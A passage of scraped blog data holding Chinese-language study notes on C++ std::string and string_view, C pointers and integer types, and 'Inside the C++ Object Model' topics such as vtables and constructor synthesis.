pos 开始直到原字符串末尾的子字符串。 len为什么可以是 -1 ？因为 -1 类型转为无符号 size_t 类型之后，是很大的数，0xffffffffffffffff。 find() find 拥有众多重载，返回这个字符第一次出现所在的位置。如果找不到，返回 -1。 12345size_t find(char c, size_t pos = 0) const noexcept;size_t find(string_view svt, size_t pos = 0) const noexcept;size_t find(string const &amp;str, size_t pos = 0) const noexcept;size_t find(const char *s, size_t pos = 0) const;size_t find(const char *s, size_t pos, size_t count) const; 为什么最后两个重载没有标记 noexcept？只是历史原因。 实际上 find 函数都是不会抛出异常的，他找不到只会返回 -1。可以用 std::string::npos 代替 -1。 12345// 都是等价的s.find(c) != string::nposs.find(c) != s.nposs.find(c) != (size_t)-1s.find(c) != -1 下面是 std::string::npos 的定义。 1static const size_type npos = static_cast&lt;size_type&gt;(-1); find(“str”, pos) 是从第 pos 个字符开始查找子字符串 “str”。 还有 find(“str”, pos, len) 和 find(“str”.substr(0, len), pos) 等价，用于查询确定长度字符串，或者要查询的字符串是个切片（string_view）的情况。 若不指定这个长度 len，则默认是 C 语言的 0 结尾字符串，此时 find 还要去求 len = strlen(“str”)，相对低效。 rfind 则是从尾部开始查找，返回最后一次出现的地方。 find_first_of() 123size_t find_first_of(string const &amp;s, size_t pos = 0) const noexcept;size_t find_first_of(const char *s, size_t pos = 0) const noexcept;size_t find_first_of(const char *s, size_t pos, size_t n) const noexcept; “str”.find_first_of(“chset”, pos) 会从第 pos 个字符开始，在 “str” 中找到第一个出现的 ‘c’ 或 ‘h’ 或 ‘s’ 或 ‘e’ 或 ‘t’ 字符，并返回他所在的位置。如果都找不到，则会返回 -1（string::npos）。 其实 s.find_first_of(“chset”) 等价于 min(s.find(‘c’), s.find(‘h’), s.find(‘s’), s.find(‘e’), s.find(‘t’))。 按空格分割字符串就可以使用下面这个方法：s.find_first_of(“ )。空格类字符是一个集合 {‘ ’, ‘, ‘, ‘, ‘’, ‘}。 1234567891011121314vector&lt;string&gt; split(string s) &#123; vector&lt;string&gt; ret; size_t pos = 0; while (true) &#123; size_t newpos = s.find_first_of(\" \\t\\v\\f\\n\\r\", pos); if (newpos == s.npos) &#123; ret.push_back(s.substr(pos, newpos)); break; &#125; ret.push_back(s.substr(pos, newpos - pos)); pos = newpos + 1; &#125; return ret;&#125; 同时也有find_first_not_of 方法寻找不在集合内的字符。 replace() replace() 替换一段子字符串。replace(pos, len, “str”) 会把从 pos 开始的 len 个字符替换为 “str”。 string 的本质和 vector 一样，是内存中连续的数组。所以当 str 长度不等于 len，就会发生数据的复制移动，从而变成 O(n) 时间复杂度，丢失性能。 append() s.append(“world”) 和 s += “world” 等价。区别在于 append 还可以指定第二个参数，限定字符串长度，用于要追加的字符串已经确定长度，或者是个切片的情况（string_view）。 例如 s.append(“world”, 3) 和 s += string(“world”, 3) 和 s += “wor” 等价。 123456string &amp;append(string const &amp;str); // str 是 C++ 字符串类 string 的对象string &amp;append(const char *s); // s 是长度为 strlen(s) 的 0 结尾字符串string &amp;append(string const &amp;str, size_t len); // 只保留后 str.size() - len 个字符string &amp;append(const char *s, size_t len); // 只保留前 len 个字符// 注意第三个重载函数，是保留 str 的后 str.size() - len 个字符 前面两个是最常用的版本，和 += 也是等价的。后面两个带 len 的版本很奇怪，他们居然不一样：对于 str 是 string 类型时，会变成保留后半部分。对于 str 是 const char * 类型时，会保留前半部分。 C++17 中有更为直观的 string_view，要切片只需 substr，例如： 123456789// string_view(“world”) 也可以简写作 “world”svs.append(“world”, 3) // 改成s += string_view(“world”).substr(0, 3)s.append(“world”s, 3) // 改成 s += string_view(“world”).substr(3) 又高效，又直观易懂，且 substr 附带了自动检查越界的能力，安全。 string_view(“world”) 也可以简写作 “world”sv。 insert() s.insert(pos, str) 会把子字符串 pos 插入到原字符串中第 pos 个字符和第 pos+1 个字符之间。函数原型： 1234string &amp;insert(size_t pos, string const &amp;str); // str 是 C++ 字符串类 string 的对象string &amp;insert(size_t pos, const char *s); // s 是长度为 strlen(s) 的 0 结尾字符串string &amp;insert(size_t pos, string const &amp;str, size_t len); // 只保留 str 后 str.size() - len 个字符string &amp;insert(size_t pos, const char *s, size_t len); // 只保留 s 前 len 个字符 compare() C 语言的 strcmp(a, b) 不仅可以判断相等，也可以用于字典序比较，返回 -1 代表 a &lt; b，返回 1 代表 a &gt; b，返回 0 代表 a == b。 string 也有一个成员函数 compare，他也是返回 -1、1、0 表示大小关系。 a == b 和 !a.compare(b) 等价。 [Not found] starts_with 和 ends_with 以下内容没有找到，成疑： s.starts_with(str) 等价于 s.substr(0, str.size()) == str s.ends_with(str) 等价于 s.substr(str.size()) == str 他们不会抛出异常，只会返回 true 或 false，表示 s 是否以 str 开头。 和 vector 类似的其他接口方法 at, [], data, size, resize, empty, clear, capacity, reserve, shrink_to_fit, insert, erase, assign, push_back, pop_back, front, back, begin, end, rbegin, rend, swap, move string 在这些函数上都和 vector&lt;char&gt; 一样。 basic_string string 被 c++filt 解析为 basic_string&lt;char, char_traits&lt;char&gt;, allocator&lt;char&gt;&gt;。std::string 就是他的类型别名（typedef）。 string_view 也是 basic_string_view&lt;char, char_traits&lt;char&gt;&gt; 的类型别名。 可自定义 char_traits ，使用比标准库更高效的字符串比较、赋值等方法。或者 allocator 自定义内存管理。 string 空基类优化 [ TODO ] string 类中，将首地址指针成员属性包装在一个继承了空基类 allocator_type 的类 _Alloc_hider 中。 因为，如果只是把 allocator（空的）直接作为成员变量放在 basic_string 里的，至少要占1个字节，再考虑字节对齐。比如，这1个字节扩展到 8 个字节。而这 8 字节没有任何数据，只是浪费空间。 如果一个类（_Alloc_hider）的基类是空类（allocator），则这个基类不占据任何空间，如果这个派生类（_Alloc_hider）如果定义了大小为 n 字节的成员变量（_M_p），则这个派生类（_Alloc_hider）的大小也是 n。 _M_allocator 从原来被迫从1字节开始对齐，到不占空间。 字符串胖指针 要描述一个动态长度的数组（此处为字符串），需要首地址指针和数组长度两个参数。C 语言假定字符串中的字符不可能出现 ‘\\0’，那么可以用 ‘\\0’ 作为结尾的标记符。 可以把这描述同一个东西的两个参数首地址指针和数组长度，打包进一个结构体（struct）里： 1234struct FatPtr &#123; char *ptr; size_t len;&#125;; 这就是 rust 炫耀已久的数组胖指针。C++20 中的 span 也是这个思想。提倡把 ptr 和 len 这两个逻辑上相关的参数绑在一起，避免程序员犯错。 C++ 中的 vector 和 string 其实都是胖指针。string 和 vector 内部都有三个成员变量：ptr, len, capacity。 前两个 [ptr, len] 其实就是表示实际有效范围（存储了字符的）的胖指针。 而 [ptr, capacity] 就是表示实际已分配内存（操作系统认为的）的胖指针。 在 GCC 的实现中，被换成了三个指针 [ptr, ptr + len, ptr + capacity] 来表示。 强引用、弱引用 string string 容器，是掌握着字符串生命周期（lifespan）的胖指针。这种掌管了所指向对象生命周期的指针称为强引用（strong reference）。 当 string 容器被拷贝时，其指向的字符串也会被拷贝（深拷贝）。 当 string 容器被销毁时，其指向的字符串也会被销毁（内存释放）。 一个强引用的 string 到处拷贝来拷贝去，则其指向的字符串也会被多次拷贝，比较低效。人们常用 string const &amp; 来避免不必要拷贝，但仍比较麻烦。 C++17 引入了弱引用胖指针 string_view，这种弱引用（weak reference）不影响原对象的生命周期，原对象的销毁仍然由强引用控制。 当 string_view 被拷贝时，其指向的字符串仍然是同一个（浅拷贝）。 当 string_view 被销毁时，其指向的字符串仍存在（弱引用不影响生命周期）。 使用原则： 强引用和弱引用都可以用来访问对象。 每个存活的对象，强引用有且只有一个。 弱引用可以同时存在多个，也可以没有。 强引用销毁时，所有弱引用都会失效。如果强引用销毁以后，仍存在其他指向该对象的弱引用，访问他会导致程序奔溃（野指针）。 建议创建 string_view 以后，不要改写原字符串。 常见强弱引用： 强引用 弱引用 string string_view wstring wstring_view vector span unique_ptr T * shared_ptr weak_ptr 小字符串优化 注意当 string 长度在15 以内，会保存在一个共享栈空间地址(_M_local_buf )，此时修改原字符串会在此地址上覆盖，还可以通过弱引用查看内容。 但是当长度大于 15 ，string 字符串保存在堆空间，一旦修改原字符串，使用弱引用会导致访存失效。 字符串切片 string(“hello”).substr(1, 3) 会得到 “ell”。 这样其实不是最高效的，因为 string.substr 并不是就地修改字符串，他是返回一个全新的 string 对象，然后把原字符串里的 1 到 3 这部分子字符串拷贝到这个新的 string 对象里去。 C++17 只需要保证原来的字符串存在于内存中，让 substr 只是返回切片后的胖指针 [ptr, len]，不就让新字符串和原字符串共享一片内存，实现了零拷贝零分配。于是就有了接口和 string 很相似，但是只保留胖指针，而不掌管他所指向内存生命周期的 string_view 类。 不论子字符串多大，真正改变的只有两个变量。 remove_prefix、remove_suffix sv.remove_prefix(n) 等价于 sv = sv.substr(n) sv.remove_suffix(n) 等价于 sv = sv.substr(0, n) 他们都是就地修改的，这个就地修改的是 string_view 对象本身，而不是修改他指向的字符串，原 string 还是不会变的。 不同之处在于，substr(pos, len) 遇到 pos &gt; sv.size() 的情况会抛出 out_of_range 异常。而 remove_prefix/suffix 就不会，如果他的 n &gt; sv.size()，则属于未定义行为，可能崩溃。 remove_prefix/suffix 更高效，substr 更安全。 类型转换规则 1234567891011// 隐式：string s = “hello”;// 显式：string s(“hello”); 或 auto s = string(“hello”);// c_str：const char *cs = s.c_str();const char * ===隐式==O(n)==&gt; string_viewconst char * ===隐式==O(n)==&gt; stringstring ===隐式==O(1)==&gt; string_viewstring_view ===显式==O(n)==&gt; stringstring ===c_str==O(1)==&gt; const char *","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"String","slug":"String","permalink":"https://racleray.github.io/tags/String/"}],"author":"HeRui"},{"title":"深入C指针","slug":"深入C指针","date":"2022-11-09T11:02:33.000Z","updated":"2024-01-09T10:20:20.905Z","comments":true,"path":"posts/379e512c.html","link":"","permalink":"https://racleray.github.io/posts/379e512c.html","excerpt":"C 指针回顾","text":"计算机使用一个字（word），表示内存地址。在 32 位计算机上会把 4 个字节（byte）拼成一个字，字由 32 个位（bit）组成。在 64 位计算机上会把 8 个字节拼成一个字，字由 64 个位组成。内存地址在内存中，就是一串固定长度的整数。 可表示的内存地址范围 虽然 64 位计算机的寄存器能处理 64 位的整数，实际上的内存地址并没有 64 位。实际上地址的高 16 位始终和第 48 位一致（符号扩展），也就是虚拟地址空间只有 48 位。 而经过 MMU 映射后实际给内存的地址只有 39 位，因此如今的 x64 架构实际上只能访问 512GB 内存，如果插了超过这个大小的内存条他也不会认出来。 此外，16 位计算机实际上能通过额外的段寄存器访问到 20 位的内存地址（1MB）。 32 位计算机还能通过 PAE 技术（物理地址扩展）访问到 36 位的内存地址（64GB）。 64 位计算机反而是因为 16777216 TB 太大，内存地址被阉割到了 39 位（512GB）。 扩展：数的表示 C 语言中的整数类型 类型 Unix 32位 Unix 64位 Windows 32位 Windows 64位 char 8 位 8 位 8 位 8 位 short 16 位 16 位 16 位 16 位 int 32 位 32 位 32 位 32 位 long 32 位 64 位 32 位 32 位 long long 64 位 64 位 64 位 64 位 long 比较特殊，在 Unix 上随系统位数变化，Windows 上始终是 32 位。所以在编写 C 语言程序时，应该避免使用 long 类型，他会导致你的程序难以跨平台。 在数字后面追加 U 和 L 可以表示不同类型的字面常量，不区分大小写，例如： 32 是 int 类型 32L 是 long 类型 32LL 是 long long 类型 32U 是 unsigned int 类型 32UL 是 unsigned long 类型 32ULL 是 unsigned long long 类型 尽管主流操作系统上 int 都是32位的，C语言标准并没有规定 int 就是32位的。int 甚至可以是16位的。 为了解决不同操作系统上对类型定义混乱的问题，C语言标准引入了 stdint.h 这个头文件。他里面包含一系列类型别名(typedef)，这些别名保证不论是什么操作系统什么架构，都是固定的大小： 123456789typedef char int8_t;typedef short int16_t;typedef int int32_t;typedef long long int64_t;typedef unsigned char uint8_t;typedef unsigned short uint16_t;typedef unsigned int uint32_t;typedef unsigned long long uint64_t; 表示内存地址的类型 指针的本质就是内存地址，所以指针的大小在 32 位系统上就 32 位，64 位系统上就 64 位。intptr_t 和 uintptr_t 自动随系统位数变化。 intptr_t 在 32 位平台上等价于 int32_t；在 64 位平台上等价于 int64_t。 uintptr_t 在 32 位平台上等价于 uint32_t；在 64 位平台上等价于 uint64_t。 另外，在主流操作系统上，size_t 和 uintptr_t 完全等价。size_t 是标准库大量使用的用于表示大小的类型，例如 vector::size() 返回类型就是 size_t。 有符号整数vs无符号整数 补码表示法，使得负数的计算可以直接使用正数的计算电路，而不用重新设计有符号位处理的新电路。 补码表示法的目的是，利用加法器的“溢出”机制，例如 -1 + 2 = 1，在计算机看来就是：11111111 + 00000010 = 100000001。溢出的1，就被丢弃，而其结果正好是1。 负数的范围反而比正数大是因为要回避 -0。 类型转换 小类型和大类型做数学运算（+-*/%）会得到两个类型中的大类型。 如果两边有一边是 unsigned 的但是基本类型是相同的，则结果是 unsigned 的：unsigned int + int = unsigned int 如果两边有一边是 unsigned 的但是基本类型是不同的，则结果是 大类型：unsigned short + int = int 浮点数表示 从下向上，可以看到浮点数被转换为计算机中二进制表示的过程。（图中127+3=130） float 由 4 个字节组成，也就是 32 个位。最高位是符号位，接着的 8 位是指数位(e)。 剩下的 23 位是底数位(m)。 注意指数位(e)是用反码表示的。 底数位限制了浮点数可表示的有效位数。 数的计算 常用函数名称： int long long long float double C++ 重载版 abs labs llabs fabsf fabs std::abs - - - fmaxf fmax std::max - - - fminf fmin std::min % % % fmodf fmod std::fmod - - - powf pow std::pow - - - sqrtf sqrt std::sqrt - - - sinf sin std::sin 注意函数调用中隐式的类型转换。C++中，可以使用更方便的重载函数。 指针 常见计算机架构中，表示指针的整数，在内存中以小端字节序保存在固定长度的内存中。 指针无非是一个 64 位整数，在 32 位计算机上则是个 32 位整数。表示的是指针所指向变量在内存中的起始地址（第一个字节所在的位置）。甚至可以把 int* 强制转换成 unsigned long 类型，来打印出这个地址的整数值。 C++ 的引用 C++ 的引用类型 int&amp; 本质无非是 int* 指针。区别在于：引用不需要手动 &amp; 来创建；不需要手动 * 来创建；无法重新赋值，指向新的变量；无法为空指针。 nullptr 在C++中根据类型调用不同的重载版本。因为C中NULL可以是 0，那么 func(int) 和 func(int*) 就区分不了。 数组指针 数组变量就是指向数组其中一个元素的指针。数组作为参数传递，会退化为指针。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C","slug":"C","permalink":"https://racleray.github.io/tags/C/"}],"author":"HeRui"},{"title":"深入C++对象模型笔记","slug":"深入C++对象模型笔记","date":"2022-06-30T12:42:31.000Z","updated":"2023-08-07T12:02:23.621Z","comments":true,"path":"posts/ae73e7a0.html","link":"","permalink":"https://racleray.github.io/posts/ae73e7a0.html","excerpt":"《深入探索C++对象模型》之前的笔记，有些过时的条款做了点改动。","text":"一、关于对象 1.0 加上封装后的布局成本（Layout Costs for Adding Encapsulation） C++在布局以及存取时间上主要的额外负担是由virtual引起的: virtual function 机制用以支持一个有效率的“执行期绑定”（runtime binding）。 virtual base class 用以实现“多次出现在继承体系中的base class，有一个单一而被共享的实例（ios）。 1.1 C++对象模型 在C++中，有两种class data members：static和nonstatic，以及三种class member functions：static、nonstatic和virtual。 在C++对象模型中，Nonstatic data members在每一个class object之内，static data members则被存放在class object之外。 Static和nonstatic function members被放在class object之外。 Virtual functions： 每一个 class 产生出一堆指向virtual functions的指针，放在表格之中。这个表格被称为 virtual table（vtbl）。 每一个class object 被安插一个指针，指向相关的virtual table。通常这个指针被称为 vptr。vptr的设定（setting）和重置（resetting）都由每一个class的constructor、destructor和copy assignment运算符自动完成。每一个 class所关联的 type_info object（用以支持runtime type identification，RTTI）也经由virtual table被指出来，通常放在表格的第一个slot（地址空间）。 1.2 关键词所带来的差异 C struct在C++中的一个合理用途，是当你要传递“一个复杂的class object的全部或部分”到某个C函数去时，struct声明可以将数据封装起来，并保证拥有与C兼容的空间布局。 然而这项保证只在组合（composition）的情况下才存在。如果是“继承”而不是“组合”，编译器会决定是否应该有额外的data members被安插到base struct subobject之中。 1.3 对象的差异 C++程序设计模型直接支持三种programming paradigms（程序设计范式）： 程序模型（procedural model）。就像 C一样，C++当然也支持它。 抽象数据类型模型（abstract data type model，ADT）。此模型所谓的“抽象”是和一组表达式（public接口）一起提供的，实际仍然未定义。 面向对象模型（object-oriented model）。在此模型中有一些彼此相关的类型，通过一个抽象的 base class（用以提供共同接口）被封装起来。 只有通过pointer或reference间接处理对象，才能支持多态性质。 C++以下列方法支持多态： 经由一组隐式的转化操作。例如把一个 derived class 指针转化为一个指向其 public base type的指针。 经由 virtual function 机制。 经由 dynamic_cast 和 typeid 运算符。 多态的主要用途是经由一个共同的接口来影响类型的封装，这个接口通常被定义在一个抽象的base class中。 需要多少内存才能够表现一个class object？一般而言要有： 其 nonstatic data members的总和大小。 加上任何由于 alignment 的需求而填补（padding）上去的空间。 alignment就是将数值调整到某数的倍数。在32位计算机上，通常alignment为4 bytes（32位），以使bus的“运输量”达到最高效率。 加上为了支持 virtual 而由内部产生的任何额外负担（overhead）。 “指向不同类型之各指针”间的差异，既不在其指针表示法不同，也不在其内容（代表一个地址）不同，而是在其所寻址出来的object类型不同。 也就是说，“指针类型”会教导编译器如何解释某个特定地址中的内存内容及其大小。 转换（cast）其实是一种编译器指令。大部分情况下它并不改变一个指针所含的真正地址，它只影响“被指出之内存的大小和其内容”的解释方式。 总而言之，多态是一种威力强大的设计机制，允许你继承一个抽象的public接口之后，封装相关的类型。需要付出的代价就是额外的间接性——不论是在“内存的获得”或是在“类型的决断”上。C++通过class的pointers和references来支持多态，这种程序设计风格就称为“面向对象”。 C++也支持具体的ADT程序风格，如今被称为object-based（OB）。例如String class，一种非多态的数据类型。String class可以展示封装的非多态形式；它提供一个public 接口和一个private实现，包括数据和算法，但是不支持类型的扩充。如今的 Go，Rust 都是走OB的路线。 一个OB设计可能比一个对等的OO设计速度更快而且空间更紧凑。速度快是因为所有的函数调用操作都在编译时期解析完成，对象建构起来时不需要设置 virtual 机制；空间紧凑则是因为每一个 class object 不需要负担传统上为了支持virtual机制而需要的额外负荷。不过，OB设计比较没有弹性。 二、构造函数语意学 implicit：暗中的、隐式的（在程序源代码中没有出现） explicit：显式的（程序源代码中出现） trivial：没有用的 nontrivial：有用的 memberwise：对每一个member施以…… bitwise：对每一个bit施以…… semantics：语意 2.1 Default Constructor的构造操作 C++新手一般有两个常见的误解： 任何class如果没有定义default constructor，就会被合成出一个来。 编译器合成出来的default constructor会显式设定“class 内每一个 data member的默认值”。 有4种情况，会造成“编译器必须为未声明 constructor 的classes合成一个default constructor”。C++Standard 把那些合成物称为 implicit nontrivial default constructors。 “带有 Default Constructor”的 Member Class Object 如果一个class没有任何constructor，但它内含一个member object，而后者有default constructor，那么这个class的 implicit default constructor就是“nontrivial”，编译器需要为该class 合成出一个default constructor。不过这个合成操作只有在constructor真正需要被调用时才会发生。再一次请你注意，被合成的default constructor只满足编译器的需要，而不是程序的需要。 如果对象的成员没有定义默认构造函数，那么编译器合成的默认构造函数将不会为之提供初始化。例如类A包含两个数据成员对象，分别为：string str和char* Cstr，那么编译器生成的默认构造函数将只提供对string类型成员的初始化，而不会提供对 char* 类型的初始化。 “带有 Default Constructor”的 Base Class 如果一个没有任何constructors的class派生自一个“带有default constructor”的base class，那么这个derived class 的default constructor 会被视为nontrivial，并因此需要被合成出来。它将调用上一层 base classes 的 default constructor（根据它们的声明顺序）。对一个后继派生的class而言，这个合成的constructor和一个“被显式提供的default constructor”没有什么差异。 “带有一个 Virtual Function”的 Class 另有两种情况，也需要合成出default constructor： class声明（或继承）一个 virtual function。 class派生自一个继承串链，其中有一个或更多的 virtual base classes。 “带有一个 Virtual Base Class”的 Class Virtual base class 的实现，在不同的编译器之间有极大的差异。然而，每一种实现法的共同点在于必须使virtual base class在其每一个derived class object中的空间位置，能够于执行期准备妥当。 被合成出来的constructor只能满足编译器（而非程序）的需要。 至于没有存在那4种情况而又没有声明任何constructor的classes，实际上default constructor并不会被合成出来。 在合成的 default constructor 中，只有 base class subobjects 和 member class objects 会被初始化。所有其他的nonstatic data member（如整数、整数指针、整数数组等等）都不会被初始化。 这些初始化操作对程序而言或许有需要，但对编译器则非必要。如果程序需要一个“把某指针设为0”的default constructor，那么提供它的人应该是程序员。 2.2 Copy Constructor的构造操作 Default Memberwise Initialization 当class object 以“相同 class 的另一个 object”作为初值，其内部是以所谓的default memberwise initialization手法完成的，也就是把每一个内建的或派生的data member（例如一个指针或一个数组）的值，从某个object拷贝一份到另一个object身上。 不过它并不会拷贝其中的 member class object，而是以递归的方式施行 memberwise initialization。 C++Standard上说，如果class没有声明一个copy constructor，就会有隐式的声明（implicitly declared）或隐式的定义（implicitly defined）出现。和以前一样，C++Standard 把copy constructor区分为trivial和nontrivial两种。只有nontrivial的实例才会被合成于程序之中。 决定一个copy constructor是否为trivial的标准在于class 是否展现出所谓的“bitwise copy semantics”。 Bitwise Copy Semantics（位逐次拷贝） 在这被合成出来的default copy constructor中，如整数、指针（浅拷贝）、数组等等的non class members也都会被复制。 什么时候一个class不展现出“bitwise copy semantics”呢？有4种情况： 当class内含一个member object而后者的class声明有一个copy constructor时（不论是被 class设计者显式地声明，就像前面的 String那样；或是被编译器合成，像 class Word那样）。 当class继承自一个base class而后者存在一个copy constructor时（不论是被显式声明或是被合成而得）。 当class声明了一个或多个virtual functions时。 当class派生自一个继承串链，其中有一个或多个virtual base classes时。 重新设定Virtual Table的指针 回忆编译期间的两个程序扩张操作（只要有一个class声明了一个或多个virtual functions就会如此）： 增加一个virtual function table（vtbl），内含每一个有作用的virtual function的地址。 一个指向virtual function table的指针（vptr），安插在每一个class object内。 编译器合成出来的 copy constructor 会显式设定 lhs object的 vptr 指向 rhs 的 virtual table，而不是直接从rhs的class object 中将vptr值拷贝过来。 处理 Virtual Base Class Subobject 1234567class Base&#123; int x;&#125;;class Derived : Base &#123; int y;&#125;; 在这个继承体系里，每个 Derived 类型的 object 就包含了一个 Base 类型的 subobject 。 一个subobject可以是成员子对象（member subobject），基类子对象（base class subobject），或者成员数组的元素。 Virtual base class的存在需要特别处理。一个class object 如果以另一个object作为初值，而后者有一个 virtual base class subobject，那么也会使“bitwise copy semantics”失效。 每一个编译器对于虚继承，都必须让“derived class object中的virtual base class subobject位置”在执行期就准备妥当。维护“位置的完整性”是编译器的责任。 “Bitwise copy semantics”可能会破坏这个位置。 小结 Bitwise Copy Semantics部分展示了4种情况，在那些情况下class不再保持“bitwise copy semantics”，而且 default copy constructor 会被视为 nontrivial。 当class内含一个member object而后者的class声明有一个copy constructor时（不论是被 class设计者显式地声明，就像前面的 String那样；或是被编译器合成，像 class Word那样）。 当class继承自一个base class而后者存在一个copy constructor时（不论是被显式声明或是被合成而得）。 当class声明了一个或多个virtual functions时。 当class派生自一个继承串链，其中有一个或多个virtual base classes时。 在这4种情况下，如果缺乏一个已声明的 copy constructor，编译器为了正确处理“以一个class object 作为另一个class object 的初值”，必须合成出一个default copy constructor。 2.3 程序转化语意学 转化 显式的初始化操作（Explicit Initialization） 参数的初始化（Argument Initialization） 返回值的初始化（Return Value Initialization） 优化方法： 在使用者层面做优化（Optimization at the User Level） 在编译器层面做优化（Optimization at the Compiler Level）。Named Return Value（NRV）优化 copy constructor的应用，迫使编译器多多少少对你的程序代码做部分转化。尤其是当一个函数以传值（by value）的方式传回一个class object，而该class有一个copy constructor时。 此外，编译器也将copy constructor的调用操作优化，以一个额外的第一参数（数值被直接存放于其中）取代 NRV。程序员如果了解那些转换，以及copy constructor 优化后的可能状态，就比较能够控制其程序的执行效率。 命名返回值优化 （Named Return Value Optimization） 对于一个如foo()这样的函数，它的每一个返回分支都返回相同的对象，编译器有可能对其做Named return Value优化（下文都简称NRV优化），方法是以引用的方式传入一个参数result取代返回对象。 1234567X foo() &#123; X xx; if(...) return xx; else return xx; &#125; 优化后的foo()以result取代xx： 123456789void foo(X &amp;result) &#123; result.X::X(); if(...) &#123; return; &#125; else &#123; return; &#125;&#125; 对比优化前与优化后的代码可以看出，对于一句类似于X a = foo()这样的代码，NRV优化后的代码相较于原代码节省了一个临时对象的空间（省略了xx），同时减少了两次函数调用（减少xx对象的默认构造函数和析构函数，以及一次拷贝构造函数的调用），增加了一次 X a 的默认构造函数的调用。 2.4 成员们的初始化队伍（Member Initialization List） 当你写下一个constructor时，就有机会设定class members的初值。经由member initialization list，或在constructor函数本体之内。 在下列情况下，为了让你的程序能够被顺利编译，你必须使用member initialization list： 当初始化一个reference member时； 当初始化一个const member时； 当调用一个base class的constructor，而它拥有一组参数，没有默认构造函数时； 当调用一个member class的constructor，而它拥有一组参数，没有默认构造函数时。 前两者因为要求定义时初始化，所以必须明确的在初始化队列中给它们提供初值。后两者因为不提供默认构造函数，所有必须显示的调用它们的带参构造函数来定义即初始化它们。 编译器会一一操作initialization list，以适当顺序在constructor之内安插初始化操作，并且在任何explicit user code之前。list中的项目顺序是由class中的members声明顺序决定的，不是由initialization list中的排列顺序决定的。 简略地说，编译器会对initialization list 一一处理并可能重新排序，以反映出members的声明顺序。它会安插一些代码到constructor体内，并置于任何explicit user code之前。initialzation list 的执行先于用户自定义的函数体。 三、Data语意学（The Semantics of Data） class的data members以及class hierarchy是中心议题。一个class的data members，一般而言，可以表现这个class在程序执行时的某种状态。Nonstatic data members放置的是“个别的class object”感兴趣的数据，static data members则放置的是“整个class”感兴趣的数据。 C++对象模型尽量以空间优化和存取速度优化的考虑来表现nonstatic data members，并且保持和C语言struct数据配置的兼容性。它把数据直接存放在每一个class object之中。对于继承而来的nonstatic data members （不管是virtual还是nonvirtual base class）也是如此。不过并没有强制定义其间的排列顺序。 至于static data members，则被放置在程序的一个global data segment 中，不会影响个别的class object的大小。在程序之中，不管该class被产生出多少个objects（经由直接产生或间接派生），static data members永远只存在一份实例（译注：甚至即使该class没有任何object实例，其static data members也已存在）。 3.1 Data Member的绑定 在一个inline member function体之内的一个data member绑定操作，会在整个class声明完成之后才发生。然而，这对于member function的argument list并不为真。Argument list中的名称还是会在它们第一次遭遇时被适当地决议（resolved）完成。 需要某种防御性程序风格：请总是把“nested type声明”放在class的起始处。 3.2 Data Member的布局 Nonstatic data members在class object中的排列顺序将和其被声明的顺序一样，任何中间介入的static data members都不会被放进对象布局之中。 编译器还可能会合成一些内部使用的data members，以支持整个对象模型。vptr就是这样的东西，目前所有的编译器都把它安插在每一个“内含virtual function之class”的 object 内。一些编译器把vptr放在一个class object的最前端。 在VC中数据成员的布局顺序为： vptr部分（如果基类有，则继承基类的） vbptr （如果需要） 基类成员（按声明顺序） 自身数据成员 虚基类数据成员（按声明顺序） 3.3 Data Member的存取 Static Data Members 每一个static data member只有一个实例，存放在程序的data segment之中。每次程序参阅（取用）static member时，就会被内部转化为对该唯一extern实例的直接参考操作。 static member并不内含在一个class object之中。 若名称冲突，编译器的解决方法是暗中对每一个static data member编码（这种手法有个很美的名称：name-mangling），以获得一个独一无二的程序识别代码。 Nonstatic Data Members Nonstatic data members直接存放在每一个class object 之中。除非经由显式的（explicit）或隐式的（implicit）class object，否则没有办法直接存取它们。 欲对一个nonstatic data member进行存取操作，编译器需要把class object的起始地址加上data member的偏移位置（offset）。 3.4 “继承”与Data Member 在C++继承模型中，一个derived class object所表现出来的东西，是其自己的members加上其base class（es） members的总和。至于derived class members和base class（es）members的排列顺序，则并未在C++Standard中强制指定；理论上编译器可以自由安排之。在大部分编译器上头，base class members总是先出现，但属于virtual base class的除外（一般而言，任何一条通则一旦碰上virtual base class就没辙了，这里亦不例外）。 只要继承不要多态（Inheritance without Polymorphism） 加上多态（Adding Polymorphism） 虚拟继承（Virtual Inheritance） 多重继承的一个语意上的副作用就是，它必须支持某种形式的“shared subobject继承”。 虚继承的子类有自己的一个vptr。 3.5 对象成员的效率 单一继承应该不会影响测试的效率，因为members被连续存储于derived class object中，并且其offset在编译时期就已知了。虚拟继承的效率会降低。 3.6 指向Data Members的指针 如何区分一个“没有指向任何data member”的指针，和一个指向“第一个data member”的指针？ 为了区分p1和p2，每一个真正的member offset值都被加上1。不论编译器或使用者都必须记住，在真正使用该值以指出一个member之前，请先减掉1。 四、Function语意学 C++支持三种类型的member functions：static、nonstatic和virtual。 4.1 Member 的各种调用方式 Nonstatic Member Functions（非静态成员函数） C++的设计准则之一就是：nonstatic member function至少必须和一般的nonmember function有相同的效率。 名称的特殊处理（Name Mangling）一般而言，member的名称前面会被加上class名称，形成独一无二的命名。 Virtual Member Functions（虚拟成员函数） 1( * ptr-&gt;vptr[1])( ptr ) vptr表示由编译器产生的指针，指向virtual table。它被安插在每一个“声明有（或继承自）一个或多个 virtual functions”的class object中。事实上其名称也会被“mangled”，因为在一个复杂的class派生体系中，可能存在多个vptrs。 1是virtual table slot的索引值，关联到 normalize()函数。 第二个ptr表示this指针。 Static Member Functions（静态成员函数） 如果取一个static member function的地址，获得的将是其在内存中的位置，也就是其地址。由于static member function没有this指针，所以其地址的类型并不是一个“指向class member function的指针”，而是一个“nonmember函数指针”。 4.2 Virtual Member Functions（虚拟成员函数） virtual function的一般实现模型：每一个class有一个virtual table，内含该class之中有作用的virtual function的地址，然后每个object有一个vptr，指向virtual table的所在。 在C++中，多态（polymorphism）表示“以一个public base class 的指针（或reference），寻址出一个derived class object”的意思。 C++对“积极多态（active polymorphism）”的唯一支持，就是对于virtual function call的决议（resolution）操作。有了RTTI，就能够在执行期查询一个多态的pointer或多态的reference了。 欲鉴定哪些 classes 